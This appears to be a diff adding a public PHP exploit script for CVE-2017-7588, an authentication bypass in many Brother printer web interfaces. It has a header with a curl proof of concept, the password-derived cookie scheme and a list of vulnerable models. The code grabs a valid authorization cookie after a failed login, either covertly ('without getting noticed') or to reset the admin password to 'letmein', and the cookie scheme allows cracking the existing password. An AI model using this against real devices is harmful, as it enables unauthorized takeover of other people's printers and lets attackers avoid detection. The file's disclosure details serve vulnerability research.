@@ -1,0 +1,204 @@
+<?php
+
+/*	
+								 
+# Title: Brother Devices Web Auth Bypass / Change Password Exploit
+# Vendor: Brother (http://www.brother.com/)
+# Affected models: Most of Brother devices from MFC, DCP, HL & ADS Series - see vulnerable models below for more info
+# Release date: 11.04.2017
+# CVE: CVE-2017-7588
+# Author: Patryk Bogdan (@patryk_bogdan)
+
+--
+
+Description:
+Most of Brother devices web authorization can be bypassed through trivial bug in login proccess.
+Even after failed login attempt, in http response headers appears valid authorization cookie.
+
+PoC for MFC-J6520DW:
+usr@lnx:~# curl -sD - --data "B734=xyz&loginurl=%2Fgeneral%2Fstatus.html" http://192.168.1.111/general/status.html -o /dev/null | grep Cookie
+Set-Cookie: AuthCookie=c243a9ee18a9327bfd419f31e75e71c7; expires=Thu, 01 Jan 1970 00:00:00 GMT; path=/; 
+
+--
+
+Modes:
+silent: Gives authorized cookie without changing password, so you can login without getting noticed.
+changepass: Change login password to the one you provided.
+
+Note:
+Authorization cookie is fixed and it is created as following:
+Plaintext password --> ASCII hex --> md5
+(e.g. AuthCookie=c243a9ee18a9327bfd419f31e75e71c7 for 'test' password)
+
+This information can be used to crack current password from exported cookie.
+
+Fix:
+Minimize network access to Brother MFC device or disable HTTP(S) interface.
+
+Confirmed vulnerable:
+MFC-J6973CDW 
+MFC-J4420DW 
+MFC-8710DW 
+MFC-J4620DW 
+MFC-L8850CDW 
+MFC-J3720 
+MFC-J6520DW 
+MFC-L2740DW 
+MFC-J5910DW 
+MFC-J6920DW 
+MFC-L2700DW 
+MFC-9130CW 
+MFC-9330CDW 
+MFC-9340CDW
+MFC-J5620DW
+MFC-J6720DW
+MFC-L8600CDW
+MFC-L9550CDW
+MFC-L2720DW
+DCP-L2540DW
+DCP-L2520DW
+HL-3140CW
+HL-3170CDW
+HL-3180CDW
+HL-L8350CDW
+HL-L2380DW
+ADS-2500W
+ADS-1000W
+ADS-1500W
+
+For educational purposes only.
+
+*/
+
+
+/* ----------------------------- */
+
+$address = "http://192.168.1.111";
+
+//$mode    = "silent";
+
+$mode    = "changepass";
+$newpass = "letmein";
+
+
+/* ----------------------------- */
+
+$user_agent = 'Mozilla/5.0 (Windows NT 6.1; rv:11.0) Gecko/20100101 Firefox/11.0';
+$address = preg_replace('{/$}', '', $address);
+libxml_use_internal_errors(true);
+
+function getPwdValue($address) {
+	
+	global $user_agent;
+	
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $address."/admin/password.html");				
+	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+	curl_setopt($ch, CURLOPT_COOKIE, getCookie($address));
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+	$content = curl_exec($ch);
+	
+	$dom = new DOMDocument();
+    $dom->loadHTML($content);
+	$inputs = $dom->getElementsByTagName('input');
+	foreach($inputs as $i) {
+		if($i->getAttribute('id') === $i->getAttribute('name') && $i->getAttribute('type') === 'password') {
+		return $i->getAttribute('name');
+		}
+	}
+	
+}
+
+function getLogValue($address) {
+			
+	global $user_agent;
+	
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $address);				
+	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+	$content = curl_exec($ch);
+	
+	$dom = new DOMDocument();
+	$dom->loadHTML($content);
+	
+	if(strstr($dom->getElementsByTagName('a')->item(0)->nodeValue, 'Please configure the password')) { 
+		print 'Seems like password is not set! Exiting.'; exit; }
+			
+	$value = $dom->getElementById('LogBox')->getAttribute('name');
+	return $value;
+	
+}
+
+function getCookie($host) {
+	
+	global $address, $user_agent;
+	
+	$log_var = getLogValue($address);
+	
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $address."/general/status.html");
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS,
+        $log_var."=xyz&loginurl=%2Fgeneral%2Fstatus.html");					
+	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+	$content = curl_exec($ch);
+	
+	if($content == true) {
+	$cookies = array();
+	preg_match_all('/Set-Cookie:(?<cookie>\s{0,}.*)$/im', $content, $cookies);
+
+	if(!empty($cookies['cookie'])) {
+		$exploded = explode(';', $cookies['cookie'][0]);
+	} else { print 'Failed getting cookies for '.$address.' address - check your settings'; exit; }
+	} else { print 'Got error requesting '.$address.' address - check your settings'; exit; }
+	
+	return trim($exploded[0]);
+	
+}
+
+if($mode === "silent") {
+
+	print 'Here\'s your authorization cookie: '.getCookie($address);
+	
+} elseif ($mode === "changepass") {
+	
+	global $address, $newpass;
+	
+	$cookie  = getCookie($address);
+	$pwd_var = getPwdValue($address);
+	
+	$ch = curl_init();
+	curl_setopt($ch, CURLOPT_URL, $address."/admin/password.html");
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS,
+            "pageid=1&".$pwd_var."=".$newpass."&temp_retypePass=".$newpass);
+	curl_setopt($ch, CURLOPT_COOKIE, $cookie);
+	curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
+	curl_setopt($ch, CURLOPT_HEADER, 1);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
+	$content = curl_exec($ch);
+
+	if($content == true) {
+		print 'Password changed to: '.$newpass;
+	} else { print 'Got error requesting '.$address.' address - check your settings'; exit; }	
+	
+}
+
+?>
